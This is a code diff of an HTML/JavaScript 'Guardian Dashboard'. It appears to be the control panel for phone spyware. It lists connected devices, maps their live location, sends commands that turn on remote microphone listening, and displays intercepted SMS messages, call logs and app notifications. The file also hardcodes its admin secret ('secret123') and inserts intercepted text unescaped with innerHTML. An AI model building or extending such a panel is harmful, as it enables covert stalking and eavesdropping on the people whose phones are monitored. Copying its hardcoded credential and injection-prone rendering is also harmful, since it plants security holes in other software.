@@ -1,20 +1,45 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-  <title>Guardian Dashboard</title>
-  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <title>Guardian Dashboard</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 
-  <!-- Leaflet Map -->
-  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <!-- Leaflet Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
-  <style>
-    body { background:#111; color:#fff; font-family:Arial; }
-    .box { border:1px solid #333; padding:10px; margin:10px; border-radius:8px; }
-    button { padding:10px; margin:5px; }
-    #map { height:300px; }
-    .log { font-size:12px; border-bottom:1px solid #333; padding:5px; }
-  </style>
+    <style>
+        body {
+            background: #111;
+            color: #fff;
+            font-family: Arial;
+        }
+
+        .box {
+            border: 1px solid #333;
+            padding: 10px;
+            margin: 10px;
+            border-radius: 8px;
+        }
+
+        button {
+            padding: 10px;
+            margin: 5px;
+        }
+
+        #map {
+            height: 300px;
+        }
+
+        .log {
+            font-size: 12px;
+            background: #1a1a1a;
+            margin: 5px 0;
+            padding: 6px;
+            border-radius: 6px;
+        }
+    </style>
 </head>
 
 <body>
@@ -23,125 +48,187 @@
 
 <!-- DEVICES -->
 <div class="box">
-  <h3>📱 Devices</h3>
-  <ul id="devices"></ul>
+    <h3>📱 Devices</h3>
+    <ul id="devices"></ul>
 </div>
 
 <!-- MAP -->
 <div class="box">
-  <h3>🗺️ Live Location</h3>
-  <div id="map"></div>
+    <h3>🗺️ Live Location</h3>
+    <div id="map"></div>
+    <p id="place">📍 Location: Unknown</p>
 </div>
 
 <!-- AUDIO -->
 <div class="box">
-  <h3>🎙️ Live Audio</h3>
-  <input id="deviceId" placeholder="Device ID"/>
-  <br>
-  <button onclick="sendCmd('start_audio')">Start Listening</button>
-  <button onclick="sendCmd('stop_audio')">Stop Listening</button>
+    <h3>🎙️ Live Audio</h3>
+    <input id="deviceId" placeholder="Device ID" />
+    <br>
+    <button onclick="sendCmd('start_audio')">Start Listening</button>
+    <button onclick="sendCmd('stop_audio')">Stop Listening</button>
 </div>
 
 <!-- SMS -->
 <div class="box">
-  <h3>💬 Live SMS</h3>
-  <div id="sms"></div>
+    <h3>💬 Live SMS</h3>
+    <div id="sms"></div>
 </div>
 
 <!-- CALL LOGS -->
 <div class="box">
-  <h3>📞 Call Logs</h3>
-  <div id="calls"></div>
+    <h3>📞 Call Logs</h3>
+    <div id="calls"></div>
 </div>
 
 <!-- LIVE LOGS -->
 <div class="box">
-  <h3>📡 Live Logs</h3>
-  <div id="logs"></div>
+    <h3>📡 Live Logs</h3>
+    <div id="logs"></div>
 </div>
 
 <script>
 const socket = io();
-
-// AUTH
 socket.emit("register_admin", "secret123");
 
-// UI elements
+// UI refs
 const devicesEl = document.getElementById("devices");
 const logsEl = document.getElementById("logs");
 const smsEl = document.getElementById("sms");
 const callsEl = document.getElementById("calls");
 
-// ================= MAP SETUP =================
-let map = L.map('map').setView([20.5937, 78.9629], 5); // India default
+// ================= MAP =================
+let map = L.map('map').setView([20.5937, 78.9629], 5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
 let marker;
 
 // ================= DEVICE LIST =================
 socket.on("device_list", (list) => {
-  devicesEl.innerHTML = "";
-  list.forEach(d => {
-    let li = document.createElement("li");
-    li.innerText = d;
-    li.onclick = () => {
-      document.getElementById("deviceId").value = d;
-    };
-    devicesEl.appendChild(li);
-  });
+    devicesEl.innerHTML = "";
+    list.forEach(d => {
+        let li = document.createElement("li");
+        li.innerText = d;
+        li.onclick = () => {
+            document.getElementById("deviceId").value = d;
+        };
+        devicesEl.appendChild(li);
+    });
 });
 
 // ================= LIVE DATA =================
 socket.on("live_data", (data) => {
-  log(JSON.stringify(data));
 
-  // LOCATION
-  if (data.type === "location") {
-    const { lat, lon } = data.data;
+    log(data);
 
-    map.setView([lat, lon], 15);
+    // LOCATION
+    if (data.type === "location") {
+        const { lat, lon } = data.data;
 
-    if (marker) {
-      marker.setLatLng([lat, lon]);
-    } else {
-      marker = L.marker([lat, lon]).addTo(map);
+        map.setView([lat, lon], 15);
+
+        if (marker) {
+            marker.setLatLng([lat, lon]);
+        } else {
+            marker = L.marker([lat, lon]).addTo(map);
+        }
+
+        getPlaceName(lat, lon);
     }
-  }
 
-  // SMS
-  if (data.type === "sms") {
-    smsEl.prepend(createItem(data.data));
-  }
+    // SMS
+    if (data.type === "sms") {
+        smsEl.prepend(createItem("sms", data.data));
+    }
 
-  // CALL LOGS
-  if (data.type === "call") {
-    callsEl.prepend(createItem(data.data));
-  }
+    // CALL
+    if (data.type === "call") {
+        callsEl.prepend(createItem("call", data.data));
+    }
+
+    // NOTIFICATION
+    if (data.type === "notification") {
+        logsEl.prepend(createItem("notification", data.data));
+    }
+
 });
 
 // ================= COMMAND =================
 function sendCmd(cmd) {
-  const id = document.getElementById("deviceId").value;
+    const id = document.getElementById("deviceId").value;
 
-  socket.emit("send_command", {
-    device_id: id,
-    command: cmd
-  });
+    socket.emit("send_command", {
+        device_id: id,
+        command: cmd
+    });
 }
 
-// ================= HELPERS =================
-function log(msg) {
-  const div = document.createElement("div");
-  div.className = "log";
-  div.innerText = msg;
-  logsEl.prepend(div);
+// ================= PLACE NAME =================
+async function getPlaceName(lat, lon) {
+    try {
+        const res = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+        );
+        const data = await res.json();
+
+        document.getElementById("place").innerText =
+            "📍 " + (data.display_name || "Unknown location");
+
+    } catch {
+        console.log("Geocode error");
+    }
 }
 
-function createItem(data) {
-  const div = document.createElement("div");
-  div.className = "log";
-  div.innerText = JSON.stringify(data);
-  return div;
+// ================= LOG =================
+function log(data) {
+    const div = document.createElement("div");
+    div.className = "log";
+
+    div.innerHTML = `
+        <b>Device:</b> ${data.device_id}<br>
+        <b>Type:</b> ${data.type}<br>
+        <small>${new Date(data.timestamp).toLocaleString()}</small>
+    `;
+
+    logsEl.prepend(div);
+}
+
+// ================= FORMAT =================
+function createItem(type, data) {
+    const div = document.createElement("div");
+    div.className = "log";
+
+    if (type === "sms") {
+        div.innerHTML = `
+            <b>📩 SMS</b><br>
+            <b>From:</b> ${data.sender}<br>
+            <b>Message:</b> ${data.message}<br>
+            <small>${new Date(data.timestamp).toLocaleString()}</small>
+        `;
+    }
+
+    else if (type === "call") {
+        div.innerHTML = `
+            <b>📞 Call</b><br>
+            <b>Number:</b> ${data.number}<br>
+            <b>Type:</b> ${data.type}<br>
+            <small>${new Date(data.timestamp).toLocaleString()}</small>
+        `;
+    }
+
+    else if (type === "notification") {
+        div.innerHTML = `
+            <b>🔔 Notification</b><br>
+            <b>App:</b> ${data.package}<br>
+            <b>Title:</b> ${data.title}<br>
+            <b>Message:</b> ${data.text}<br>
+        `;
+    }
+
+    else {
+        div.innerText = JSON.stringify(data);
+    }
+
+    return div;
 }
 </script>
 
